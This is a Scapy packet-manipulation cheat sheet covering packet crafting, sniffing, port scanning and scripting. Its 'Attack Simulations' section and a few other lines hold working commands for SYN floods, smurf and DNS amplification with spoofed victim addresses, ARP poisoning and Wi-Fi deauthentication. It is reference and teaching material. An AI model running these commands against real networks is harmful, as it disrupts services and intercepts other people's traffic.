# Scapy Cheat Sheet

Scapy is a powerful Python-based interactive packet manipulation program and library. It can forge or decode packets, send them on the wire, capture them, and match requests and replies.

## 📋 Table of Contents
- [Installation](#installation)
- [Basic Usage](#basic-usage)
- [Packet Creation](#packet-creation)
- [Sending Packets](#sending-packets)
- [Sniffing Packets](#sniffing-packets)
- [Packet Manipulation](#packet-manipulation)
- [Layer Operations](#layer-operations)
- [Common Protocols](#common-protocols)
- [Network Scanning](#network-scanning)
- [Attack Simulations](#attack-simulations)
- [Advanced Techniques](#advanced-techniques)

## Installation

```bash
# Install Scapy
pip install scapy

# Install with all features
pip install scapy[complete]

# On Linux (may need additional packages)
sudo apt-get install python3-scapy

# Verify installation
scapy
```

## Basic Usage

```python
# Start Scapy interactive shell
>>> from scapy.all import *

# Get help
>>> help(IP)
>>> ls(IP)          # List fields and default values
>>> lsc()           # List all commands

# View protocol layers
>>> ls()            # List all protocols
>>> explore()       # Interactive protocol explorer
```

## Packet Creation

### Creating Simple Packets

```python
# Create IP packet
>>> ip = IP(dst="192.168.1.1")

# Create TCP packet
>>> tcp = TCP(dport=80)

# Stack layers (using / operator)
>>> packet = IP(dst="192.168.1.1")/TCP(dport=80)

# Create complete packet with payload
>>> packet = IP(dst="192.168.1.1")/TCP(dport=80)/"GET / HTTP/1.0\r\n\r\n"

# View packet
>>> packet.show()

# Summary view
>>> packet.summary()
```

### Layer-specific Creation

```python
# Ethernet layer
>>> ether = Ether(dst="ff:ff:ff:ff:ff:ff")

# IP layer
>>> ip = IP(src="192.168.1.100", dst="192.168.1.1")

# TCP layer
>>> tcp = TCP(sport=1234, dport=80, flags="S")

# UDP layer
>>> udp = UDP(sport=1234, dport=53)

# ICMP layer
>>> icmp = ICMP(type=8, code=0)

# DNS layer
>>> dns = DNS(qd=DNSQR(qname="example.com"))

# ARP layer
>>> arp = ARP(pdst="192.168.1.1")

# Complete packet
>>> packet = Ether()/IP()/TCP()/Raw(load="data")
```

## Sending Packets

### Layer 3 Send (send)

```python
# Send one packet (Layer 3)
>>> send(IP(dst="192.168.1.1")/ICMP())

# Send multiple packets
>>> send(IP(dst="192.168.1.1")/ICMP(), count=5)

# Send with inter-packet interval
>>> send(IP(dst="192.168.1.1")/ICMP(), inter=1)  # 1 second between packets

# Verbose output
>>> send(IP(dst="192.168.1.1")/ICMP(), verbose=1)
```

### Layer 2 Send (sendp)

```python
# Send packet at Layer 2
>>> sendp(Ether()/IP(dst="192.168.1.1")/ICMP(), iface="eth0")

# Send to broadcast
>>> sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"), iface="eth0")
```

### Send and Receive (sr, srp)

```python
# Send and receive Layer 3
>>> ans, unans = sr(IP(dst="192.168.1.1")/ICMP())

# Send and receive Layer 2
>>> ans, unans = srp(Ether()/IP(dst="192.168.1.1")/ICMP(), iface="eth0")

# Send one packet and receive one response (sr1)
>>> packet = sr1(IP(dst="8.8.8.8")/ICMP())
>>> packet.show()

# With timeout
>>> ans, unans = sr(IP(dst="192.168.1.1")/ICMP(), timeout=2)

# Process responses
>>> for sent, received in ans:
...     print(received.summary())
```

## Sniffing Packets

### Basic Sniffing

```python
# Sniff packets
>>> packets = sniff(count=10)

# Sniff on specific interface
>>> packets = sniff(iface="eth0", count=10)

# Sniff with filter (BPF syntax)
>>> packets = sniff(filter="tcp port 80", count=10)

# Sniff with timeout
>>> packets = sniff(timeout=10)

# Sniff and process with callback
>>> def packet_callback(packet):
...     print(packet.summary())
>>> sniff(prn=packet_callback, count=10)

# Sniff and stop on condition
>>> def stop_filter(packet):
...     return packet.haslayer(TCP) and packet[TCP].flags == "PA"
>>> packets = sniff(stop_filter=stop_filter)
```

### Advanced Sniffing

```python
# Sniff with lambda callback
>>> sniff(prn=lambda x: x.summary(), count=10)

# Sniff and store specific packets
>>> packets = sniff(lfilter=lambda x: x.haslayer(TCP) and x[TCP].dport == 80, count=10)

# Sniff in promiscuous mode
>>> sniff(iface="eth0", promisc=True, count=10)

# Sniff and save to file
>>> sniff(count=100, prn=lambda x: wrpcap("capture.pcap", x, append=True))

# Offline sniffing (read from file)
>>> packets = rdpcap("capture.pcap")
>>> for packet in packets:
...     print(packet.summary())
```

## Packet Manipulation

### Accessing Fields

```python
# Create packet
>>> packet = IP(dst="192.168.1.1")/TCP(dport=80)/"GET / HTTP/1.0"

# Access layers
>>> packet[IP]
>>> packet[TCP]
>>> packet[Raw]

# Access fields
>>> packet[IP].dst
>>> packet[TCP].dport
>>> packet[TCP].flags

# Modify fields
>>> packet[IP].ttl = 64
>>> packet[TCP].flags = "S"

# Check if layer exists
>>> packet.haslayer(TCP)

# Get layer by name
>>> packet.getlayer(TCP)
```

### Packet Analysis

```python
# Display packet
>>> packet.show()

# Summary
>>> packet.summary()

# List fields
>>> ls(packet)

# Hexdump
>>> hexdump(packet)

# Raw bytes
>>> bytes(packet)

# Packet length
>>> len(packet)

# Get specific layer
>>> packet[TCP].show()
```

## Layer Operations

### IP Layer

```python
# Basic IP packet
>>> ip = IP(dst="192.168.1.1")

# Set TTL
>>> ip = IP(dst="192.168.1.1", ttl=64)

# Set source
>>> ip = IP(src="192.168.1.100", dst="192.168.1.1")

# Fragment packets
>>> frags = fragment(IP(dst="192.168.1.1")/ICMP()/"X"*2000)
>>> for frag in frags:
...     send(frag)

# IP options
>>> ip = IP(dst="192.168.1.1", options=[IPOption_RR()])  # Record Route
```

### TCP Layer

```python
# SYN packet
>>> syn = IP(dst="192.168.1.1")/TCP(dport=80, flags="S")

# SYN-ACK packet
>>> synack = IP(dst="192.168.1.1")/TCP(dport=80, flags="SA")

# ACK packet
>>> ack = IP(dst="192.168.1.1")/TCP(dport=80, flags="A", ack=1)

# PSH-ACK packet
>>> pshack = IP(dst="192.168.1.1")/TCP(dport=80, flags="PA")/"data"

# FIN packet
>>> fin = IP(dst="192.168.1.1")/TCP(dport=80, flags="F")

# RST packet
>>> rst = IP(dst="192.168.1.1")/TCP(dport=80, flags="R")

# Set sequence and acknowledgment numbers
>>> tcp = TCP(sport=1234, dport=80, seq=1000, ack=1)
```

### UDP Layer

```python
# Basic UDP packet
>>> udp = IP(dst="192.168.1.1")/UDP(dport=53)

# DNS query
>>> dns = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(qd=DNSQR(qname="example.com"))

# DHCP discover
>>> dhcp = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
```

### ICMP Layer

```python
# Ping (Echo Request)
>>> ping = IP(dst="192.168.1.1")/ICMP()

# Echo Reply
>>> pong = IP(dst="192.168.1.1")/ICMP(type=0)

# Destination Unreachable
>>> unreach = IP(dst="192.168.1.1")/ICMP(type=3, code=3)

# Time Exceeded
>>> exceeded = IP(dst="192.168.1.1")/ICMP(type=11, code=0)

# Traceroute
>>> result, unans = sr(IP(dst="8.8.8.8", ttl=(1,20))/ICMP())
```

## Common Protocols

### ARP

```python
# ARP request
>>> arp = ARP(pdst="192.168.1.1")
>>> ans, unans = sr(arp)

# ARP scan (subnet)
>>> ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"), timeout=2)

# Process ARP responses
>>> for sent, received in ans:
...     print(f"{received.psrc} -> {received.hwsrc}")

# ARP poisoning (example - use carefully!)
>>> send(ARP(op=2, pdst="192.168.1.100", psrc="192.168.1.1", hwdst="aa:bb:cc:dd:ee:ff"))
```

### DNS

```python
# DNS query
>>> dns_req = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(qd=DNSQR(qname="example.com"))
>>> ans = sr1(dns_req)
>>> ans.show()

# Get DNS answer
>>> if ans and ans.haslayer(DNS):
...     print(ans[DNS].an.rdata)

# DNS A record query
>>> sr1(IP(dst="8.8.8.8")/UDP()/DNS(qd=DNSQR(qname="example.com", qtype="A")))

# DNS MX record query
>>> sr1(IP(dst="8.8.8.8")/UDP()/DNS(qd=DNSQR(qname="example.com", qtype="MX")))
```

### HTTP

```python
# HTTP GET request
>>> http_get = IP(dst="example.com")/TCP(dport=80, flags="PA")/b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"
>>> send(http_get)

# HTTP POST request
>>> http_post = IP(dst="example.com")/TCP(dport=80, flags="PA")/b"POST /api HTTP/1.1\r\nHost: example.com\r\nContent-Length: 13\r\n\r\ntest=data"
>>> send(http_post)
```

## Network Scanning

### Port Scanning

```python
# TCP SYN scan (single port)
>>> ans, unans = sr(IP(dst="192.168.1.1")/TCP(dport=80, flags="S"), timeout=1)

# TCP SYN scan (multiple ports)
>>> ans, unans = sr(IP(dst="192.168.1.1")/TCP(dport=(1,1024), flags="S"), timeout=2)

# Process results
>>> for sent, received in ans:
...     if received.haslayer(TCP) and received[TCP].flags == "SA":
...         print(f"Port {sent[TCP].dport} is open")

# TCP Connect scan
>>> ans, unans = sr(IP(dst="192.168.1.1")/TCP(dport=(1,1024), flags="S"))

# UDP scan
>>> ans, unans = sr(IP(dst="192.168.1.1")/UDP(dport=53), timeout=2)

# Stealth scan (NULL, FIN, XMAS)
>>> sr(IP(dst="192.168.1.1")/TCP(dport=80, flags=""))      # NULL
>>> sr(IP(dst="192.168.1.1")/TCP(dport=80, flags="F"))     # FIN
>>> sr(IP(dst="192.168.1.1")/TCP(dport=80, flags="FPU"))   # XMAS
```

### Host Discovery

```python
# ICMP ping sweep
>>> ans, unans = sr(IP(dst="192.168.1.0/24")/ICMP(), timeout=2)
>>> for sent, received in ans:
...     print(f"{received.src} is up")

# ARP ping (local network)
>>> ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"), timeout=2)

# TCP ping
>>> ans, unans = sr(IP(dst="192.168.1.0/24")/TCP(dport=80, flags="S"), timeout=2)
```

### OS Fingerprinting

```python
# Basic OS fingerprinting
>>> ans, unans = sr(IP(dst="192.168.1.1")/TCP(dport=80, flags="S"))
>>> if ans:
...     packet = ans[0][1]
...     ttl = packet[IP].ttl
...     window = packet[TCP].window
...     print(f"TTL: {ttl}, Window: {window}")
...     if ttl <= 64:
...         print("Likely Linux/Unix")
...     elif ttl <= 128:
...         print("Likely Windows")
```

## Attack Simulations

### SYN Flood

```python
# SYN flood (educational purposes only!)
>>> send(IP(dst="192.168.1.1")/TCP(dport=80, flags="S"), loop=1)

# Random source SYN flood
>>> send(IP(src=RandIP(), dst="192.168.1.1")/TCP(dport=80, flags="S"), loop=1)
```

### Ping of Death

```python
# Large ICMP packet
>>> send(fragment(IP(dst="192.168.1.1")/ICMP()/("X"*60000)))
```

### Land Attack

```python
# Same source and destination
>>> send(IP(src="192.168.1.1", dst="192.168.1.1")/TCP(sport=135, dport=135))
```

### Smurf Attack

```python
# ICMP to broadcast with spoofed source
>>> send(IP(src="192.168.1.1", dst="192.168.1.255")/ICMP())
```

### DNS Amplification

```python
# DNS query to open resolver
>>> send(IP(src="<victim_ip>", dst="<open_resolver>")/UDP()/DNS(qd=DNSQR(qname="example.com", qtype="ANY")))
```

## Advanced Techniques

### Packet Crafting

```python
# Custom TCP options
>>> tcp = TCP(dport=80, options=[('MSS', 1460), ('NOP', None), ('WScale', 7)])

# Random values
>>> IP(dst="192.168.1.1", id=RandShort())
>>> TCP(sport=RandShort(), seq=RandInt())

# Fuzzing
>>> send(IP(dst="192.168.1.1")/fuzz(TCP(dport=80)))
```

### Traceroute

```python
# ICMP traceroute
>>> result, unans = sr(IP(dst="8.8.8.8", ttl=(1,30))/ICMP())
>>> for sent, received in result:
...     print(f"{sent.ttl}: {received.src}")

# TCP traceroute
>>> result, unans = sr(IP(dst="8.8.8.8", ttl=(1,30))/TCP(dport=80, flags="S"))
```

### Packet Sniffing and Analysis

```python
# Sniff and analyze
>>> def analyze_packet(packet):
...     if packet.haslayer(TCP):
...         if packet[TCP].flags == "S":
...             print(f"SYN to port {packet[TCP].dport}")
...     elif packet.haslayer(ICMP):
...         print(f"ICMP from {packet[IP].src}")
>>> sniff(prn=analyze_packet, count=50)
```

### Session Hijacking Detection

```python
# Monitor for duplicate TCP packets
>>> def detect_hijack(packet):
...     if packet.haslayer(TCP):
...         # Store and compare sequence numbers
...         pass
>>> sniff(prn=detect_hijack, filter="tcp")
```

### Wireless (802.11)

```python
# Requires monitor mode interface
# Beacon frame
>>> sendp(RadioTap()/Dot11()/Dot11Beacon()/Dot11Elt(ID="SSID", info="TestAP"), iface="wlan0mon")

# Deauth frame
>>> sendp(RadioTap()/Dot11(addr1="<client_mac>", addr2="<ap_mac>", addr3="<ap_mac>")/Dot11Deauth(), iface="wlan0mon")
```

## Utility Functions

```python
# Calculate checksum
>>> packet = IP(dst="192.168.1.1")/TCP(dport=80)
>>> del packet[IP].chksum
>>> del packet[TCP].chksum
>>> packet = IP(bytes(packet))  # Recalculate checksums

# Write packets to file
>>> wrpcap("packets.pcap", packets)

# Read packets from file
>>> packets = rdpcap("packets.pcap")

# Merge pcap files
>>> packets1 = rdpcap("file1.pcap")
>>> packets2 = rdpcap("file2.pcap")
>>> wrpcap("merged.pcap", packets1 + packets2)

# Filter packets
>>> tcp_packets = [p for p in packets if TCP in p]

# Count packets by protocol
>>> from collections import Counter
>>> Counter([p.sprintf("%IP.proto%") for p in packets if IP in p])
```

## Scripting with Scapy

```python
#!/usr/bin/env python3
from scapy.all import *

# Port scanner example
def port_scan(target, ports):
    open_ports = []
    for port in ports:
        pkt = IP(dst=target)/TCP(dport=port, flags="S")
        resp = sr1(pkt, timeout=1, verbose=0)
        if resp and resp.haslayer(TCP):
            if resp[TCP].flags == "SA":
                open_ports.append(port)
                # Send RST to close connection
                rst = IP(dst=target)/TCP(dport=port, flags="R")
                send(rst, verbose=0)
    return open_ports

# Usage
target = "192.168.1.1"
ports = range(1, 1025)
open_ports = port_scan(target, ports)
print(f"Open ports: {open_ports}")
```

## Resources

- [Scapy Documentation](https://scapy.readthedocs.io/)
- [Scapy GitHub](https://github.com/secdev/scapy)
- [Scapy Usage Examples](https://scapy.readthedocs.io/en/latest/usage.html)

## Legal Notice

⚠️ **WARNING**: Scapy is a powerful tool that can be used for both legitimate network testing and malicious activities. Only use Scapy on networks and systems you own or have explicit written permission to test. Unauthorized use may be illegal and unethical.

---

**Pro Tip**: Scapy is excellent for rapid prototyping of network tools and for educational purposes. Always test in isolated environments first.

